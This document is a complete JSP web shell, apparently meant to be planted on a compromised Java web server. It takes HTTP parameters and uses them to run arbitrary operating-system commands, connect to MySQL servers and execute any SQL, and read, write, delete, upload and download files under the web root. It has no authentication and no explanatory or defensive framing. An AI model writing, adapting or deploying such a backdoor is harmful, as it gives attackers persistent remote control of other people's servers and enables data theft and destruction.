<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%
	String key = "key";
	String act = request.getParameter(key);
	response.setContentType("text/html;charset=UTF-8");
	if (act.equals("uname")) {
		out.print(System.getProperty("os.name"));
	}

	if (act.equals("shell")) {
		try {
			String cmd = request.getParameter("cmd");
			Process child = Runtime.getRuntime().exec(cmd);
			InputStream in = child.getInputStream();
			int c;
			while ((c = in.read()) != -1) {
				out.print((char) c);
			}
			in.close();
			try {
				child.waitFor();
			} catch (InterruptedException e) {
				out.print(e);
			}
		} catch (IOException e) {
			out.print(e);
		}
	}

	if (act.equals("databaseconnect")) {

		Connection conn = null;
		String database_ = request.getParameter("database");
		String url = "jdbc:mysql://" + request.getParameter("sqlAddress") + ":3306/" + database_;
		String user = request.getParameter("user");
		String password = request.getParameter("password");
		//加载驱动包
		Class.forName("com.mysql.jdbc.Driver");
		//获取连接对象

		try {
			conn = (Connection) DriverManager.getConnection(url, user, password);
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		PreparedStatement ptmt = conn.prepareStatement(request.getParameter("sql"));
		ResultSet rs = ptmt.executeQuery(request.getParameter("sql"));
		ResultSetMetaData rsmd = rs.getMetaData();
		if (request.getParameter("type").equals("insert") || request.getParameter("type").equals("update")
				|| request.getParameter("type").equals("delete")) {
			int row = ptmt.executeUpdate();
			if (row == 0) {
				out.print("false");
				throw new RuntimeException();// 出错抛异常
			} else {
				out.print("done");
			}
		} else {
			try {
				ResultSet set = ptmt.executeQuery();
				for (int i = 0; i < rsmd.getColumnCount(); i++) {
					out.print(rsmd.getColumnName(i + 1) + "\t|\t");
				}
				out.print("\n------------------------------------------------------\n");
				while (set.next()) {
					for (int i = 0; i < rsmd.getColumnCount(); i++) {
						out.print(set.getString(i + 1) + "\t|\t");
					}
					out.print("\n");
				}
			} catch (SQLException e) {
			}
		}
		if (conn != null) {
			conn.close();
		}
	}

	if (act.equals("file")) {
		//URL xmlpath = this.getClass().getClassLoader().getResource("."); 
		//System.out.println(xmlpath); 
		//String path=request.getRequestURI();
		String path = request.getRealPath("");
		switch (request.getParameter("ds")) {
		case "read":
			FileInputStream inputStream = null;
			Scanner sc = null;
			try {
			    inputStream = new FileInputStream(path+request.getParameter("cpath")+request.getParameter("c1"));
			    //if(inputStream.exists()){out.print("not existed!");break;}
			    sc = new Scanner(inputStream, "UTF-8");
			    while (sc.hasNextLine()) {
			        String line = sc.nextLine();
			        out.println(line);
			    }
			    // note that Scanner suppresses exceptions
			    if (sc.ioException() != null) {
			        throw sc.ioException();
			    }
			} finally {
			    if (inputStream != null) {
			        inputStream.close();
			    }
			    if (sc != null) {
			        sc.close();
			    }
			}
			break;
		case "delete":
			File fileDe = new File(path+request.getParameter("cpath")+request.getParameter("c1"));
	        if (!fileDe.exists()) {
	            out.println("false:" + request.getParameter("c1") + " not existed!");
	        } else {
	            if (fileDe.isFile()){
	                fileDe.delete();
	                out.println("done!");
	            }
	            else
	                out.println("dir can't delete!");
	        };
			break;
		case "mkdir":
			File fileMD = new File(path+request.getParameter("cpath")+request.getParameter("c1"));
			 if (!fileMD.exists()) {
		            fileMD.mkdirs();
		            if (!fileMD.exists()) out.println("false!");
		            else out.println("done!");
		        } else {
		            out.println("dir existed!");
		        };
			break;
		case "rmdir":
			File fileDr = new File(path+request.getParameter("cpath")+request.getParameter("c1"));
	        if (!fileDr.exists()) {
	            out.println("false:" + request.getParameter("c1") + " not existed!");
	        } else {
	            if (fileDr.isFile())
	            	out.println("it's file,can't delete!");
	            else{
	            	fileDr.delete();
	            	out.println("done!");
	       		 }
	        };
			break;
		case "mkfile":
			File fileFl = new File(path+request.getParameter("cpath")+request.getParameter("c1"));
			if(!fileFl.exists()){
				boolean rec = fileFl.createNewFile();
				if(rec)out.println("done!");
				else out.println("false!");
			}else{
				out.println("file is existed!");
			}
			break;
		case "dir":
			File dir = new File(path+request.getParameter("cpath"));
			File[] files = dir.listFiles();
			for (int i = 0; i < files.length; i++) {
				if (!files[i].isDirectory())
					out.println(files[i].getName());
				else
					out.println("[" + files[i].getName() + "]");
			}
			break;
		case "pwd":
			out.print(path+request.getParameter("cpath"));
			break;
		case "rename":
			File oldFile=new File(path+request.getParameter("cpath")+request.getParameter("c1")); 
            File newFile=new File(path+request.getParameter("cpath")+request.getParameter("c2")); 
			 if(!request.getParameter("c1").equals(request.getParameter("c2"))){ 
		            if(!oldFile.exists()){
		            	out.println(request.getParameter("c1")+" unexisted!"); 
		            }
		            if(newFile.exists()) 
		                out.println(request.getParameter("c2")+" existed!"); 
		            else{ 
		                oldFile.renameTo(newFile); 
		                out.println("done!");
		            } 
		        }else{
		            out.println("no change!");
		        }
			break;
		case "copy":
            	try{
            		File oldCP=new File(path+request.getParameter("cpath")+request.getParameter("c1")); 
                	File newCP=new File(path+request.getParameter("cpath")+request.getParameter("c2")); 
            		newCP.createNewFile();
            		FileInputStream c=new FileInputStream(oldCP);
            		FileOutputStream d=new FileOutputStream(newCP);
            		byte[] date=new byte[512];
            		int i=0;
            		while((i=c.read(date))>0){
            			d.write(date);
            			}
            		c.close();
            		d.close();
            		out.println("done!");
            	}catch(IOException e){
            		e.printStackTrace();
            	}
			break;
		case "write":
			try{
			      File fileW =new File(path+request.getParameter("cpath")+request.getParameter("c1"));
			      if(!fileW.exists()){
			       fileW.createNewFile();
			      }
			      FileWriter fileWritterW = new FileWriter(path+request.getParameter("cpath")+request.getParameter("c1"));
			      fileWritterW.write(request.getParameter("c2"));
			      //fileWritterW.write("ggggggggggggggggg");
			      fileWritterW.close();

			      out.println("done!");

			     }catch(IOException e){
			      e.printStackTrace();
			     };
			break;
		case "writeto":
			try{
			      File fileWt =new File(path+request.getParameter("cpath")+request.getParameter("c1"));
			      if(!fileWt.exists()){
			       fileWt.createNewFile();
			      }
			      FileWriter fileWritterWt = new FileWriter(path+request.getParameter("cpath")+request.getParameter("c1"),true);
			      fileWritterWt.write(request.getParameter("c2"));
			      fileWritterWt.close();

			      out.println("done!");

			     }catch(IOException e){
			      e.printStackTrace();
			     };
			break;
		case "upload":
			out.println("upload");
			try{
			      File fileu =new File(path+request.getParameter("cpath")+request.getParameter("c1"));
			      if(!fileu.exists()){
			       fileu.createNewFile();
			      }
			      FileWriter fileWritteru = new FileWriter(path+request.getParameter("cpath")+request.getParameter("c1"));
			      fileWritteru.write(request.getParameter("c2"));
			      fileWritteru.close();

			      out.println("done!");

			     }catch(IOException e){
			      e.printStackTrace();
			     };
			break;
		case "download":
			FileInputStream inputStreamD = null;
			Scanner scD = null;
			try {
			    inputStreamD = new FileInputStream(path+request.getParameter("cpath")+request.getParameter("c1"));
			    scD = new Scanner(inputStreamD, "UTF-8");
			    while (scD.hasNextLine()) {
			        String lineD = scD.nextLine();
			        out.println(lineD);
			    }
			    if (scD.ioException() != null) {
			        throw scD.ioException();
			    }
			} finally {
			    if (inputStreamD != null) {
			        inputStreamD.close();
			    }
			    if (scD != null) {
			        scD.close();
			    }
			};
			break;
		default:
			break;
		}
	}
%>